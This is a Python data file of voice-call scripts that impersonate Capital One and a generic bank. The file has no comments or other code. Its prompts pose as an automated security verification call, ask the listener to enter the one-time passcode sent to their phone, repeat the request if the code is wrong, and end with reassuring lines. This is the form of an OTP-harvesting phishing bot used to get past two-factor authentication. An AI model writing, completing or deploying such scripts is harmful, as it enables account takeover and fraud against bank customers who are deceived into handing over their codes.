# scripts.py

SCRIPTS = {
    "capital_one": {
        "languages": {
            "en-US": {
                "intro": "Hello. This is an automated security verification call.",
                "recording": "Please enter the six digit one time passcode sent to your phone.",
                "retry": "That code was incorrect. Please try again.",
                "safe": "Thank you. Your account has been successfully verified.",
                "fraud": "We have detected suspicious activity. This incident will be reviewed.",
                "menu": "Press one if this was you. Press two if this was not you.",
                "escalate": "Please hold while we connect you to a security specialist."
            }
        }
    },

    "generic_bank": {
        "languages": {
            "en-US": {
                "intro": "This is an automated verification call from your financial institution.",
                "recording": "Enter your verification code now.",
                "retry": "Invalid entry. Please try again.",
                "safe": "Verification complete. No further action is required.",
                "fraud": "This activity has been flagged as fraudulent.",
                "menu": "Press one to confirm. Press two to report fraud.",
                "escalate": "Connecting you to a representative."
            }
        }
    }
}
